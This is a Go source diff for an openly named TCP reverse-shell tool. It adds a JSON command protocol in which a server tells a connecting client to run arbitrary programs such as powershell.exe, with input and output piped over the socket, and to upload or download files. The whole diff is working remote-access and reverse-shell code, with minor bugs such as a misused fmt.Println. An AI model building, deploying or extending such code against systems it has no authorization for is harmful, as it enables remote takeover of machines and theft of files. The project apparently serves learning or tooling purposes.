@@ -1,10 +1,12 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"os"
+	"strings"
 
 	"github.com/mang0kitty/tcpReverseShell/rsh"
 
@@ -42,17 +44,52 @@ func startServer(c *cli.Context) error {
 	if err != nil {
 		return err
 	}
-
 	defer tcp.Close()
+	cmd := &Command{
+		Type:      c.Args().First(),
+		Arguments: c.Args().Slice()[1:],
+		//Arguments: []string{"powershell.exe", "-NoExit", "-Command", "Write-Host 'Instruction Received'"},
+	}
 
-	// TODO: handle errors by shutting down the server + client
-	go func() {
-		io.Copy(tcp, os.Stdin)
-	}()
+	switch cmd.Type {
+	case "app":
+	case "upload":
+	case "download":
+	case "exit":
+	default:
+		log.Fatal("Unknown command received")
+	}
 
-	_, err = io.Copy(os.Stdout, tcp)
+	//instruction := "powershell.exe"
+	//tcp.Send([]byte(instruction))
+
+	json.NewEncoder(tcp).Encode(cmd)
+
+	switch cmd.Type {
+	case "app":
+		// TODO: handle errors by shutting down the server + client
+		go func() {
+			io.Copy(tcp, os.Stdin)
+		}()
+		_, err = io.Copy(os.Stdout, tcp)
+	case "upload":
+		Download("rsh/hello.txt", tcp)
+	case "download":
+		Upload("rsh/hello.txt", tcp)
+	case "exit":
+	default:
+		log.Fatal("Unknown command received")
+	}
+
 	return err
 }
+
+type Command struct {
+	Type      string   `json:"type"`
+	Arguments []string `json:"args"`
+}
+
+// CmdType: app, download, upload, exit
 
 func startClient(c *cli.Context) error {
 	addr := c.String("addr")
@@ -64,13 +101,65 @@ func startClient(c *cli.Context) error {
 
 	defer tcp.Close()
 
-	ps := rsh.AppRunner{
-		Stdin:  tcp,
-		Stdout: tcp,
+	cmd := &Command{}
+	json.NewDecoder(tcp).Decode(&cmd)
+
+	switch cmd.Type {
+	case "app":
+		ps := rsh.AppRunner{
+			Stdin:  tcp,
+			Stdout: tcp,
+		}
+		err = ps.Execute(cmd.Arguments[0], cmd.Arguments[1:]...)
+		if err != nil {
+			log.Fatal(err)
+		}
+	case "return":
+		return nil
+	case "upload":
+		err = Upload(cmd.Arguments[0], tcp)
+		if err != nil {
+			log.Fatal(err)
+		}
+	case "download":
+		err = Download(cmd.Arguments[0], tcp)
+		if err != nil {
+			log.Fatal(err)
+		}
+	default:
+		fmt.Println("Unrecognized Command Type %s\n", cmd.Type)
 	}
 
-	err = ps.Execute("powershell.exe", "-NoExit", "-Command", "Write-Host 'This is a sub-shell'")
+	if err != nil {
+		log.Fatal(err)
+	}
 
+	return nil
+}
+
+func Download(fileName string, conn rsh.Transport) error {
+	file, err := os.OpenFile(strings.TrimSpace(fileName), os.O_CREATE, os.ModePerm)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+
+	_, err = io.Copy(file, conn)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	return nil
+}
+
+func Upload(fileName string, conn rsh.Transport) error {
+	file, err := os.Open(fileName)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+
+	_, err = io.Copy(conn, file)
 	if err != nil {
 		log.Fatal(err)
 	}
